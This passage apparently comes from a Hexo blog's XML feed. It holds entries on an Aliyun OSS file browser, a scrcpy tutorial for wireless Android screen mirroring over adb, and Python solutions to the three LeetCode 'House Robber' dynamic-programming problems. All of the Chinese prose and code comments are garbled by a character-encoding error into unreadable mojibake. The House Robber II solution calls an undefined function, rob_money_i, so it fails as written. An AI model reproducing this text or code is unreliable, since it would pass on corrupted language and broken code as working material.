<p>ç”¨ossæ­å»ºå›¾åºŠåªæ˜¯ä¸€ä¸ªå°å°çš„åŠŸèƒ½ï¼Œå°±æ¯”å¦‚ä½ è¿˜å¯ä»¥æŠŠå®ƒå½“ä½œä¸€ä¸ªäººäº‘ç›˜å­˜æ”¾èµ„æ–™ç”¨ã€‚</p>
</blockquote>
<p>è¿™é‡Œæ¨èé˜¿é‡Œäº‘çš„å¯è§†åŒ–ç®¡ç†å™¨ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„æ“ä½œé‡Œé¢çš„æ–‡ä»¶ï¼Œå·²ç»è¿›è¡Œä¸€äº›é…ç½®ã€‚</p>
<p>github -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaXl1bi9vc3MtYnJvd3Nlcg==">https://github.com/aliyun/oss-browser</span><br>gitee -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vbWlycm9ycy9vc3MtYnJvd3Nlcg==">https://gitee.com/mirrors/oss-browser</span></p>
]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>oss</tag>
        <tag>cdn</tag>
      </tags>
  </entry>
  <entry>
    <title>scrcpy ä¼˜é›…çš„å®‰å“æŠ•å±å·¥å…·</title>
    <url>/72a0046c/</url>
    <content><![CDATA[<style type="text/css">.post img {border-radius: 0;}</style>

<blockquote>
<p>é¡¹ç›®åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dlbnltb2JpbGUvc2NyY3B5">ğŸšª</span><br>å®˜æ–¹æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dlbnltb2JpbGUvc2NyY3B5L2Jsb2IvbWFzdGVyL1JFQURNRS56aC1IYW5zLm1k">ğŸšª</span></p>
</blockquote>
<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><ul>
<li><p>ä¸‹è½½åŒ…<br>ç‰ˆæœ¬é¡µé¢ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dlbnltb2JpbGUvc2NyY3B5L3RhZ3M=">https://github.com/Genymobile/scrcpy/tags</span></p>
</li>
<li><p>è§£å‹(ä½ç½®éšæ„)</p>
<p>è¿™é‡Œè§£å‹åˆ°<code>C:\Tools\scrcpy</code><br>å› ä¸ºåŒ…è‡ªå¸¦<code>adb</code>å·¥å…·, è¿™é‡Œå¯ä»¥ä¸ç”¨é¢å¤–é…ç½®<code>adb</code>, å·²é…ç½®å¥½çš„å¯ä»¥å¿½ç•¥</p>
<img data-src="http://img.owq.world/2021/11/2124-7e8658.png" style="zoom:50%;" />
</li>
<li><p>è®¾ç½®ç¯å¢ƒå˜é‡</p>
<p>ç³»ç»Ÿå±æ€§ - ç¯å¢ƒå˜é‡ - æ–°å¢Pathå˜é‡ -æ·»åŠ è§£å‹ç›®å½•<br><img data-src="http://img.owq.world/2021/11/2127-fb6625.png"></p>
</li>
<li><p>éªŒè¯æµ‹è¯•</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb ç‰ˆæœ¬</span></span><br><span class="line">adb version</span><br><span class="line"></span><br><span class="line"><span class="comment"># scrcpy ç‰ˆæœ¬</span></span><br><span class="line">scrcpy <span class="literal">-v</span></span><br></pre></td></tr></table></figure>

<img data-src="http://img.owq.world/2021/11/2124-6ca332.png" alt="" style="zoom:67%;" />

<p>æˆåŠŸè¾“å‡ºç‰ˆæœ¬ä¿¡æ¯åˆ™é…ç½®å®Œæˆ~</p>
</li>
</ul>
<h2 id="å¼€å§‹ä½¿ç”¨"><a href="#å¼€å§‹ä½¿ç”¨" class="headerlink" title="å¼€å§‹ä½¿ç”¨"></a>å¼€å§‹ä½¿ç”¨</h2><h3 id="åˆå§‹é…ç½®"><a href="#åˆå§‹é…ç½®" class="headerlink" title="åˆå§‹é…ç½®"></a>åˆå§‹é…ç½®</h3><ul>
<li><p>ç¬¬ä¸€æ¬¡ä½¿ç”¨, å…ˆè¿›è¡Œä»¥ä¸‹é…ç½®, ç„¶åç”¨<strong>æ•°æ®çº¿</strong>è¿æ¥PC</p>
<ul>
<li>è¿›å…¥å¼€å‘è€…é€‰é¡¹ æ‰“å¼€<strong>USBè°ƒè¯•</strong></li>
<li>è¿›å…¥WiFiè®¾ç½® é…ç½®<strong>é™æ€IP</strong></li>
</ul>
</li>
<li><p>ç»ˆç«¯è¾“å…¥<code>scrcpy</code>ç›´æ¥è¿›è¡Œæœ‰çº¿è¿æ¥æ§åˆ¶(å¯é€‰)</p>
</li>
<li><p>å¼€æ”¾æ‰‹æœº<code>TCP</code>æœåŠ¡ç«¯å£, ç”¨æ¥è¿›è¡Œæ— çº¿è¿æ¥(å…³é”®)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb tcpip 5555 <span class="comment"># è¿™é‡Œè®¾ç½®ç«¯å£ä¸º5555</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å¤šå°è®¾å¤‡è¿æ¥<br>  å¦‚æœ<code>adb</code>å·²ç»è¿æ¥å¤šå°è®¾å¤‡çš„è¯, è¿è¡Œä»¥ä¸Šå‘½ä»¤ä¼šæŠ¥<code>error: more than one device/emulator</code>é”™è¯¯, è¿™æ—¶ä½ éœ€è¦æŒ‡å®šä¸‹<code>device</code></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹è¿æ¥çš„è®¾å¤‡</span></span><br><span class="line">adb devices</span><br><span class="line"></span><br><span class="line"><span class="comment"># -s æŒ‡å®šdeviceså¼€æ”¾ç«¯å£</span></span><br><span class="line">adb -s [devices] tcpip 5555</span><br></pre></td></tr></table></figure>

<p>  <strong>Tips:</strong> åªè¿æ¥ä¸€ä¸ªè®¾å¤‡æ—¶å¯ä»¥ä¸ç”¨æŒ‡å®š<code>device</code></p>
</li>
</ul>
<p><em>PS: æ‰‹æœºé‡å¯åè®¾ç½®ä¼šä¸¢å¤±, éœ€è¦é‡æ–°è¿æ¥ç”µè„‘é…ç½®</em> åˆ°è¿™é‡Œå°±å¯ä»¥æ–­å¼€æ•°æ®çº¿äº†ğŸ˜</p>
<h3 id="æ— çº¿è¿æ¥"><a href="#æ— çº¿è¿æ¥" class="headerlink" title="æ— çº¿è¿æ¥"></a>æ— çº¿è¿æ¥</h3><p>ä½¿ç”¨ä½ è®¾ç½®å¥½çš„é™æ€IPè¿æ¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># scrcpy -s [ip]:[port]</span></span><br><span class="line">scrcpy -s 192.168.0.90:5555</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ ä¸Š --turn-screen-off è®¾ç½®è®¾å¤‡é»‘å±</span></span><br><span class="line"><span class="comment"># å¯åŠ¨åä½¿ç”¨å¿«æ·é”® Alt + o æ›´åŠ æ–¹ä¾¿å“¦</span></span><br><span class="line">scrcpy --turn-screen-off</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å¼€å§‹æ„‰å¿«çš„æŠ•å±ä¹‹æ—…å§ğŸ¥³</p>
<h2 id="å¿«æ·é”®"><a href="#å¿«æ·é”®" class="headerlink" title="å¿«æ·é”®"></a>å¿«æ·é”®</h2><table>
<thead>
<tr>
<th align="left">æ“ä½œ</th>
<th align="left">å¿«æ·é”®</th>
</tr>
</thead>
<tbody><tr>
<td align="left">å…¨å±</td>
<td align="left">Alt + f</td>
</tr>
<tr>
<td align="left">å‘å·¦æ—‹è½¬å±å¹•</td>
<td align="left">Alt + â† (å·¦ç®­å¤´)</td>
</tr>
<tr>
<td align="left">å‘å³æ—‹è½¬å±å¹•</td>
<td align="left">Alt + â†’ <em>(<em>å³ç®­å¤´</em>)</em></td>
</tr>
<tr>
<td align="left">å°†çª—å£å¤§å°é‡ç½®ä¸º1:1 (åŒ¹é…åƒç´ )</td>
<td align="left">Alt + g</td>
</tr>
<tr>
<td align="left">å°†çª—å£å¤§å°é‡ç½®ä¸ºæ¶ˆé™¤é»‘è¾¹</td>
<td align="left">Alt + w | åŒå‡»</td>
</tr>
<tr>
<td align="left">ç‚¹æŒ‰ <code>ä¸»å±å¹•</code></td>
<td align="left">Alt + h | é¼ æ ‡ä¸­é”®</td>
</tr>
<tr>
<td align="left">ç‚¹æŒ‰ <code>è¿”å›</code></td>
<td align="left">Alt + b | é¼ æ ‡å³é”®</td>
</tr>
<tr>
<td align="left">ç‚¹æŒ‰ <code>åˆ‡æ¢åº”ç”¨</code></td>
<td align="left">Alt + s</td>
</tr>
<tr>
<td align="left">ç‚¹æŒ‰ <code>èœå•</code> (è§£é”å±å¹•)</td>
<td align="left">Alt + m</td>
</tr>
<tr>
<td align="left">ç‚¹æŒ‰ <code>éŸ³é‡ + </code></td>
<td align="left">Alt + â†‘ (ä¸Šç®­å¤´)</td>
</tr>
<tr>
<td align="left">ç‚¹æŒ‰ <code>éŸ³é‡-</code></td>
<td align="left">Alt + â†“ (ä¸‹ç®­å¤´)</td>
</tr>
<tr>
<td align="left">ç‚¹æŒ‰ <code>ç”µæº</code></td>
<td align="left">Alt + p</td>
</tr>
<tr>
<td align="left">æ‰“å¼€å±å¹•</td>
<td align="left">é¼ æ ‡å³é”®</td>
</tr>
<tr>
<td align="left">å…³é—­è®¾å¤‡å±å¹• (ä½†ç»§ç»­åœ¨ç”µè„‘ä¸Šæ˜¾ç¤º)</td>
<td align="left">Alt + o</td>
</tr>
<tr>
<td align="left">æ‰“å¼€è®¾å¤‡å±å¹•</td>
<td align="left">Alt + Shift + o</td>
</tr>
<tr>
<td align="left">æ—‹è½¬è®¾å¤‡å±å¹•</td>
<td align="left">Alt + r</td>
</tr>
<tr>
<td align="left">å±•å¼€é€šçŸ¥é¢æ¿</td>
<td align="left">Alt + n</td>
</tr>
<tr>
<td align="left">æ”¶èµ·é€šçŸ¥é¢æ¿</td>
<td align="left">Alt + Shift + n</td>
</tr>
<tr>
<td align="left">å¤åˆ¶åˆ°å‰ªè´´æ¿</td>
<td align="left">Alt + c</td>
</tr>
<tr>
<td align="left">å‰ªåˆ‡åˆ°å‰ªè´´æ¿</td>
<td align="left">Alt + x</td>
</tr>
<tr>
<td align="left">åŒæ­¥å‰ªè´´æ¿å¹¶ç²˜è´´</td>
<td align="left">Alt + v</td>
</tr>
<tr>
<td align="left">æ³¨å…¥ç”µè„‘å‰ªè´´æ¿æ–‡æœ¬</td>
<td align="left">Alt + Shift + v</td>
</tr>
<tr>
<td align="left">æ‰“å¼€&#x2F;å…³é—­FPSæ˜¾ç¤º (åœ¨ stdout)</td>
<td align="left">Alt + i</td>
</tr>
<tr>
<td align="left">ææ‹‰ç¼©æ”¾</td>
<td align="left">Ctrl + æŒ‰ä½å¹¶ç§»åŠ¨é¼ æ ‡</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>å¥½è½¯å·¥å…·</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>adb</tag>
      </tags>
  </entry>
  <entry>
    <title>åŠ¨æ€è§„åˆ’ æ‰“å®¶åŠ«èˆ</title>
    <url>/bd9e5b39/</url>
    <content><![CDATA[<h2 id="Question-â… ğŸ”"><a href="#Question-â… ğŸ”" class="headerlink" title="Question â… ğŸ”"></a>Question â… ğŸ”</h2><blockquote>
<p>ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„å°å·ï¼Œè®¡åˆ’å·çªƒæ²¿è¡—çš„æˆ¿å±‹ã€‚æ¯é—´æˆ¿å†…éƒ½è—æœ‰ä¸€å®šçš„ç°é‡‘ï¼Œ<br>å½±å“ä½ å·çªƒçš„å”¯ä¸€åˆ¶çº¦å› ç´ å°±æ˜¯ç›¸é‚»çš„æˆ¿å±‹è£…æœ‰ç›¸äº’è¿é€šçš„é˜²ç›—ç³»ç»Ÿï¼Œ<strong>å¦‚æœä¸¤é—´ç›¸é‚»çš„æˆ¿å±‹åœ¨åŒä¸€æ™šä¸Šè¢«å°å·é—¯å…¥ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æŠ¥è­¦</strong>ã€‚<br>ç»™å®šä¸€ä¸ªä»£è¡¨æ¯ä¸ªæˆ¿å±‹å­˜æ”¾é‡‘é¢çš„éè´Ÿæ•´æ•°æ•°ç»„ï¼Œè®¡ç®—ä½  <strong>ä¸è§¦åŠ¨è­¦æŠ¥è£…ç½®çš„æƒ…å†µä¸‹</strong> ï¼Œä¸€å¤œä¹‹å†…èƒ½å¤Ÿå·çªƒåˆ°çš„æœ€é«˜é‡‘é¢ã€‚</p>
</blockquote>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ï¼š[1,2,3,1]</span><br><span class="line">è¾“å‡ºï¼š4</span><br><span class="line">è§£é‡Šï¼šå·çªƒ 1 å·æˆ¿å±‹ (é‡‘é¢ = 1) ï¼Œç„¶åå·çªƒ 3 å·æˆ¿å±‹ (é‡‘é¢ = 3)ã€‚</span><br><span class="line">Â     å·çªƒåˆ°çš„æœ€é«˜é‡‘é¢ = 1 + 3 = 4 ã€‚</span><br><span class="line">Â     </span><br><span class="line">è¾“å…¥ï¼š[2,7,9,3,1]</span><br><span class="line">è¾“å‡ºï¼š12</span><br><span class="line">è§£é‡Šï¼šå·çªƒ 1 å·æˆ¿å±‹ (é‡‘é¢ = 2), å·çªƒ 3 å·æˆ¿å±‹ (é‡‘é¢ = 9)ï¼Œæ¥ç€å·çªƒ 5 å·æˆ¿å±‹ (é‡‘é¢ = 1)ã€‚</span><br><span class="line">Â     å·çªƒåˆ°çš„æœ€é«˜é‡‘é¢ = 2 + 9 + 1 = 12 ã€‚</span><br></pre></td></tr></table></figure>



<h2 id="Code-â… ğŸ’¡"><a href="#Code-â… ğŸ’¡" class="headerlink" title="Code â… ğŸ’¡"></a>Code â… ğŸ’¡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_rob_i</span>(<span class="params">nums: <span class="built_in">list</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å½“æ— æˆ¿é—´æ—¶, ç›´æ¥è¿”å›0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> nums:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åªæœ‰ä¸€ä¸ªæˆ¿é—´æ—¶, é‚£å°±åªèƒ½å·å®ƒçš„äº†</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½®ä¸€ä¸ªåˆ—è¡¨, ä¸‹æ ‡ i å¯¹åº”ç€å‰ i ä¸ªæˆ¿é—´å¯ä»¥å·å–çš„æœ€å¤§é‡‘é¢</span></span><br><span class="line">    max_money = [<span class="number">0</span>, nums[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä»ç¬¬2ä¸ªæˆ¿é—´å¼€å§‹è®¡ç®—, ä¼ å…¥ç¬¬1ä¸ªæˆ¿é—´åçš„åˆ—è¡¨</span></span><br><span class="line">    <span class="comment"># è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯, å– max_money å¯¹åº”å€¼æ—¶, i è¦è¿›è¡ŒåŠ ä¸€</span></span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums[<span class="number">1</span>:]):</span><br><span class="line">        <span class="comment"># max_money[i+1] è¡¨ç¤ºä¸å·å–å½“å‰æˆ¿é—´çš„ç´¯è®¡é‡‘é¢</span></span><br><span class="line">        <span class="comment"># max_money[i] + v è¡¨ç¤ºå·å–å½“å‰æˆ¿é—´çš„ç´¯è®¡é‡‘é¢</span></span><br><span class="line">        <span class="comment"># å¯¹æ¯”2ç§æƒ…å†µ, å–æœ€å¤§å€¼è¿½åŠ åˆ° max_money ä¸­</span></span><br><span class="line">        max_money.append(<span class="built_in">max</span>(max_money[i+<span class="number">1</span>], max_money[i] + v))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿”å›æœ€åä¸€ä¸ªå€¼</span></span><br><span class="line">    <span class="keyword">return</span> max_money[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åŸé¢˜åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvaG91c2Utcm9iYmVyLw==">https://leetcode-cn.com/problems/house-robber/</span></p>
</blockquote>
<h2 id="Test-â… ğŸ’ "><a href="#Test-â… ğŸ’ " class="headerlink" title="Test â… ğŸ’ "></a>Test â… ğŸ’ </h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;house_rob_i&#x27;</span>)</span><br><span class="line">nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(house_rob_i(nums))</span><br><span class="line">nums = [<span class="number">2</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(house_rob_i(nums))</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="Question-â…¡ğŸ”"><a href="#Question-â…¡ğŸ”" class="headerlink" title="Question â…¡ğŸ”"></a>Question â…¡ğŸ”</h2><blockquote>
<p>ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„å°å·ï¼Œè®¡åˆ’å·çªƒæ²¿è¡—çš„æˆ¿å±‹ï¼Œæ¯é—´æˆ¿å†…éƒ½è—æœ‰ä¸€å®šçš„ç°é‡‘ã€‚<br>è¿™ä¸ªåœ°æ–¹æ‰€æœ‰çš„æˆ¿å±‹éƒ½ <strong>å›´æˆä¸€åœˆ</strong> ï¼Œè¿™æ„å‘³ç€ç¬¬ä¸€ä¸ªæˆ¿å±‹å’Œæœ€åä¸€ä¸ªæˆ¿å±‹æ˜¯ç´§æŒ¨ç€çš„ã€‚<br>åŒæ—¶ï¼Œç›¸é‚»çš„æˆ¿å±‹è£…æœ‰ç›¸äº’è¿é€šçš„é˜²ç›—ç³»ç»Ÿï¼Œå¦‚æœä¸¤é—´ç›¸é‚»çš„æˆ¿å±‹åœ¨åŒä¸€æ™šä¸Šè¢«å°å·é—¯å…¥ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æŠ¥è­¦ ã€‚<br>ç»™å®šä¸€ä¸ªä»£è¡¨æ¯ä¸ªæˆ¿å±‹å­˜æ”¾é‡‘é¢çš„éè´Ÿæ•´æ•°æ•°ç»„ï¼Œè®¡ç®—ä½  åœ¨ä¸è§¦åŠ¨è­¦æŠ¥è£…ç½®çš„æƒ…å†µä¸‹ ï¼Œä»Šæ™šèƒ½å¤Ÿå·çªƒåˆ°çš„æœ€é«˜é‡‘é¢ã€‚</p>
</blockquote>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [2,3,2]</span><br><span class="line">è¾“å‡ºï¼š3</span><br><span class="line">è§£é‡Šï¼šä½ ä¸èƒ½å…ˆå·çªƒ 1 å·æˆ¿å±‹ï¼ˆé‡‘é¢ = 2ï¼‰ï¼Œç„¶åå·çªƒ 3 å·æˆ¿å±‹ï¼ˆé‡‘é¢ = 2ï¼‰, å› ä¸ºä»–ä»¬æ˜¯ç›¸é‚»çš„ã€‚</span><br><span class="line"></span><br><span class="line">è¾“å…¥ï¼šnums = [1,2,3,1]</span><br><span class="line">è¾“å‡ºï¼š4</span><br><span class="line">è§£é‡Šï¼šä½ å¯ä»¥å…ˆå·çªƒ 1 å·æˆ¿å±‹ï¼ˆé‡‘é¢ = 1ï¼‰ï¼Œç„¶åå·çªƒ 3 å·æˆ¿å±‹ï¼ˆé‡‘é¢ = 3ï¼‰ã€‚</span><br><span class="line">Â     å·çªƒåˆ°çš„æœ€é«˜é‡‘é¢ = 1 + 3 = 4 ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="Code-â…¡ğŸ’¡"><a href="#Code-â…¡ğŸ’¡" class="headerlink" title="Code â…¡ğŸ’¡"></a>Code â…¡ğŸ’¡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_rob_ii</span>(<span class="params">nums: <span class="built_in">list</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="comment"># è¿™é‡Œåªéœ€è¦åœ¨ç¬¬ä¸€é¢˜çš„åŸºç¡€ä¸Šè€ƒè™‘ä¸¤ç§æƒ…å†µ</span></span><br><span class="line">    <span class="comment"># ç¬¬ä¸€ç§: åŒ…å«é¦–å…ƒç´ , ä¸åŒ…å«å°¾å…ƒç´ </span></span><br><span class="line">    <span class="comment"># ç¬¬äºŒç§: ä¸åŒ…å«é¦–å…ƒç´ , åŒ…å«å°¾å…ƒç´ </span></span><br><span class="line">    <span class="comment"># ç»¼ä¸Š, ä¸€è¡Œä»£ç æå®š~</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(rob_money_i(nums[<span class="number">1</span>:]), rob_money_i(nums[:-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åŸé¢˜åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvaG91c2Utcm9iYmVyLWlpLw==">https://leetcode-cn.com/problems/house-robber-ii/</span></p>
</blockquote>
<h2 id="Test-â…¡ğŸ’ "><a href="#Test-â…¡ğŸ’ " class="headerlink" title="Test â…¡ğŸ’ "></a>Test â…¡ğŸ’ </h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;house_rob_ii&#x27;</span>)</span><br><span class="line">nums = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(house_rob_ii(nums))</span><br><span class="line">nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(house_rob_ii(nums))</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="Question-â…¢ğŸ”"><a href="#Question-â…¢ğŸ”" class="headerlink" title="Question â…¢ğŸ”"></a>Question â…¢ğŸ”</h2><blockquote>
<p>åœ¨ä¸Šæ¬¡æ‰“åŠ«å®Œä¸€æ¡è¡—é“ä¹‹åå’Œä¸€åœˆæˆ¿å±‹åï¼Œå°å·åˆå‘ç°äº†ä¸€ä¸ªæ–°çš„å¯è¡Œçªƒçš„åœ°åŒºã€‚<br>è¿™ä¸ªåœ°åŒºåªæœ‰ä¸€ä¸ªå…¥å£ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œæ ¹â€ã€‚ é™¤äº†â€œæ ¹â€ä¹‹å¤–ï¼Œæ¯æ ‹æˆ¿å­æœ‰ä¸”åªæœ‰ä¸€ä¸ªâ€œçˆ¶â€œæˆ¿å­ä¸ä¹‹ç›¸è¿ã€‚<br>ä¸€ç•ªä¾¦å¯Ÿä¹‹åï¼Œèªæ˜çš„å°å·æ„è¯†åˆ°â€œè¿™ä¸ªåœ°æ–¹çš„æ‰€æœ‰æˆ¿å±‹çš„æ’åˆ—ç±»ä¼¼äº<strong>ä¸€æ£µäºŒå‰æ ‘</strong>â€ã€‚<br>å¦‚æœä¸¤ä¸ªç›´æ¥ç›¸è¿çš„æˆ¿å­åœ¨åŒä¸€å¤©æ™šä¸Šè¢«æ‰“åŠ«ï¼Œæˆ¿å±‹å°†è‡ªåŠ¨æŠ¥è­¦ã€‚è®¡ç®—åœ¨ä¸è§¦åŠ¨è­¦æŠ¥çš„æƒ…å†µä¸‹ï¼Œå°å·ä¸€æ™šèƒ½å¤Ÿç›—å–çš„æœ€é«˜é‡‘é¢ã€‚</p>
</blockquote>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">è¾“å…¥: [3,2,3,null,3,null,1]      3</span><br><span class="line">                                / <span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>                               2   3</span><br><span class="line">                                <span class="keyword">\ </span>  <span class="keyword">\ </span></span><br><span class="line">                                 3   1</span><br><span class="line">è¾“å‡º: 7 </span><br><span class="line">è§£é‡Š:Â å°å·ä¸€æ™šèƒ½å¤Ÿç›—å–çš„æœ€é«˜é‡‘é¢ = 3 + 3 + 1 = 7.</span><br><span class="line"></span><br><span class="line">è¾“å…¥: [3,4,5,1,3,null,1]Â     3</span><br><span class="line">                            / <span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>                           4   5</span><br><span class="line">                          / <span class="keyword">\ </span>  <span class="keyword">\ </span></span><br><span class="line">                         1   3   1</span><br><span class="line">è¾“å‡º: 9</span><br><span class="line">è§£é‡Š:Â å°å·ä¸€æ™šèƒ½å¤Ÿç›—å–çš„æœ€é«˜é‡‘é¢Â = 4 + 5 = 9.</span><br></pre></td></tr></table></figure>



<h2 id="Code-â…¢ğŸ’¡"><a href="#Code-â…¢ğŸ’¡" class="headerlink" title="Code â…¢ğŸ’¡"></a>Code â…¢ğŸ’¡</h2><blockquote>
<p>è¿›é˜¶ç‰ˆæ¥äº†, è¿™é‡Œè€ƒè™‘çš„åŒæ ·æ˜¯å‰ä¸€ä¸ªæˆ¿å­å’Œåä¸€ä¸ªæˆ¿å­æ˜¯å¦ç›¸éš”, éœ€è¦è€ƒè™‘çš„åŒæ ·åªæœ‰ä¸¤ç§æƒ…å†µ, è§£é¢˜æ€è·¯æ˜¯ä¸€æ ·çš„.<br>ä½†è¦æ³¨æ„çš„æ˜¯, è¿™æ˜¯äºŒå‰æ ‘ç»“æ„, è¿™æ ·çš„è¯, æ¯ä¸ªèŠ‚ç‚¹æœ‰ä¸¤ç§æƒ…å†µ, è€Œæ¯ä¸ªèŠ‚ç‚¹ç”±æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹(æˆ‘ä»¬æŠŠç©ºçš„èŠ‚ç‚¹å½“æˆ0), æ—¢æœ‰${2^n}$çš„å¯èƒ½, å› æ­¤é‡‡ç”¨é€’å½’çš„æ–¹å¼æ¥è§£å†³é—®é¢˜ä¼šæ›´æ–¹ä¾¿.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_rob_iii</span>(<span class="params">root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è®¾ç½®é€’å½’å‡½æ•°, è¿”å›å·å–å½“å‰å±‚å’Œä¸å·å–å½“å‰å±‚çš„é’±</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">node = root</span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å½“å‰èŠ‚ç‚¹ä¸ºç©º, å½“å‰å±‚å’Œä¸å·å–å½“å‰å±‚çš„é’±éƒ½ä¸º0, è¿”å›(0,0)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># é€’å½’è·å–å·¦å³å­æ ‘èƒ½å·å–çš„é‡‘é¢</span></span><br><span class="line">        L, R = dfs(node.left), dfs(node.right)</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># node.val+(L[1]+R[1]) è¡¨ç¤ºå·å–å½“å‰å±‚å’Œä¸‹ä¸‹å±‚çš„é‡‘é¢</span></span><br><span class="line">        <span class="comment"># max(L)+max(R) è¡¨ç¤ºå½“å‰å±‚ä¸å·,å·å–ä¸‹ä¸€å±‚çš„é‡‘é¢</span></span><br><span class="line">        <span class="keyword">return</span> (node.val+(L[<span class="number">1</span>]+R[<span class="number">1</span>]), <span class="built_in">max</span>(L)+<span class="built_in">max</span>(R))</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># è¿”å›å·ç¬¬ä¸€ä¸ªæˆ¿å­é‡‘é¢å’Œä¸å·ç¬¬ä¸€ä¸ªæˆ¿å­é‡‘é¢çš„æœ€å¤§å€¼</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(dfs())</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åŸé¢˜åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvaG91c2Utcm9iYmVyLWlpaS8=">https://leetcode-cn.com/problems/house-robber-iii/</span></p>
</blockquote>
<h2 id="Test-â…¢ğŸ’ "><a href="#Test-â…¢ğŸ’ " class="headerlink" title="Test â…¢ğŸ’ "></a>Test â…¢ğŸ’ </h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, val=<span class="number">0</span>, left=<span class="literal">None</span>, right=<span class="literal">None</span></span>):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;house_rob_iii&#x27;</span>)</span><br><span class="line">root = TreeNode(<span 